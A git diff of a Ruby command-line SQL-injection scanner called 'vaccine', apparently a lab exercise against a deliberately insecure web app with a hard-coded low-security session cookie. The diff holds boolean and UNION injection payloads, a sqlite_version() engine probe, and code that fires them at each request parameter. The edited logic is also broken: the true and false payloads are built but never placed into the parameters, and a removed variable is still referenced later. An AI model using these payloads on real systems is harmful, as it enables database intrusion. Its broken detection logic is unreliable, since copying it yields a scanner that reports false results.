@@ -7,16 +7,8 @@ require 'yaml'
 require 'uri'
 
 PAYLOADS = {
-  mysql: {
     boolean_true: "' AND 1=1-- ",
     boolean_false: "' AND 1=0-- ",
-    union_check: "' UNION SELECT 1,2,3,4-- "
-  },
-  sqlite: {
-    boolean_true: "' AND 1=1-- ",
-    boolean_false: "' AND 1=0-- ",
-    union_check: "' UNION SELECT sqlite_version(),2-- "
-  }
 }
 
 class Config 
@@ -74,7 +66,7 @@ def make_request(url, request, params)
     req.set_form_data(params)
   else 
     puts "[VACCINE] request type not suported"
-    return nil
+    exit 1 
   end
   req["Cookie"] = "PHPSESSID=c131r7vsgpj4iu22m5rmljpce0; security=low"
   req["User-Agent"] = "Mozilla/5.0"
@@ -221,15 +213,23 @@ if original_res.code != "200"
 end
 
   base_params.each do |key, value|
-    current_payload = "#{value}#{PAYLOADS[:mysql][:boolean_false]}"
-    attack_params = base_params.dup
-    attack_params[key] = current_payload
+    true_payload  = "#{value}#{PAYLOADS[:boolean_true]}"
+    false_payload = "#{value}#{PAYLOADS[:boolean_false]}"
+    true_params = base_params.dup
+    false_params = base_params.dup
    
-    attack_res = make_request(url, request, attack_params)
-    next unless attack_res
+    res_true = make_request(url, request, true_params)
+    res_false = make_request(url, request, false_params)
+    next unless res_true 
+    next unless res_false 
+    if res_true.body.length > res_false.body.length
+      len = res_true.body.length - res_false.body.length
+    else
+      len = res_false.body.length - res_true.body.length 
+    end
 
-    if attack_res.body.to_s.length != original_res.body.to_s.length
-      puts "[VACCINE] VULNERABILITY DETECTED WITH BOOLEAN ATTACK on parameter: #{key}"
+    if len > 50 
+      puts "[VACCINE] POSSIBLE VULNERABILITY DETECTED WITH BOOLEAN ATTACK on parameter: #{key}"
 
       sqlite_params = base_params.dup
       sqlite_params[key] = "#{value}' AND sqlite_version() IS NOT NULL-- "
@@ -265,6 +265,8 @@ end
       }
       save_to_yaml(path, url, request, key, current_payload, engine, dump_info)
       break 
+  else 
+    puts "[VACCINE] NOT VULNERABILITY DETECTED "
     end
   end
 end
@@ -278,10 +280,8 @@ def main
 
   conf = Config.new(url)
   parse_input(input, conf)
-  # Aquí va tu lógica de vaccine
   begin
   res = vaccine(conf.url, conf.path, conf.request)
-  vaccine(url, method, output)
   rescue Errno::ECONNREFUSED
   puts "[VACCINE] server #{url} response failed"
   exit 1
